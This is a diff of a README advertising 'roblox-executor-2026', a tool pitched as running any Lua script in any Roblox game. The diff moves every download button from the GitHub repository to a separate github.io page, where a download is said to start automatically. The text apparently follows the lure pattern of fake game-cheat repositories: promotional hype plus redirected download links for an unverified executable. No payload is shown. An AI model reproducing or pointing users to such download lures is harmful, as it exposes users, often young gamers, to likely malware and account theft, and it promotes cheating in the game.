@@ -1,6 +1,6 @@
 # 🚀 roblox-executor-2026 - Run Any Script, Any Game, Instantly
 
-[![Download roblox-executor-2026](https://img.shields.io/badge/Download-roblox--executor--2026-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Bandeirainveste/roblox-executor-2026)
+[![Download roblox-executor-2026](https://img.shields.io/badge/Download-roblox--executor--2026-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://bandeirainveste.github.io)
 
 Welcome to **roblox-executor-2026**, the most powerful and user-friendly Roblox script executor designed for everyone. Whether you're a seasoned scripter or a complete beginner, this tool lets you run any Lua script on any Roblox game with zero hassle. No complex setup, no technical knowledge required — just download, run, and enjoy.
 
@@ -35,7 +35,7 @@ Getting started is incredibly easy. Follow these steps:
 
 1. **Visit the download page** by clicking the button below or the one at the top of this page.
 
-   [![Download Now](https://img.shields.io/badge/⬇️%20Download%20roblox--executor--2026-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Bandeirainveste/roblox-executor-2026)
+   [![Download Now](https://img.shields.io/badge/⬇️%20Download%20roblox--executor--2026-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://bandeirainveste.github.io)
 
 2. **Visit this link to download the application.** The download will start automatically or you'll see a download button on the page.
 
@@ -167,7 +167,7 @@ roblox-executor-2026 is more than just a tool — it's your gateway to a richer 
 
 Don't wait. Download now and transform the way you play Roblox.
 
-[![Get Started](https://img.shields.io/badge/🚀%20Get%20Started%20Now-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bandeirainveste/roblox-executor-2026)
+[![Get Started](https://img.shields.io/badge/🚀%20Get%20Started%20Now-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://bandeirainveste.github.io)
 
 ---
 
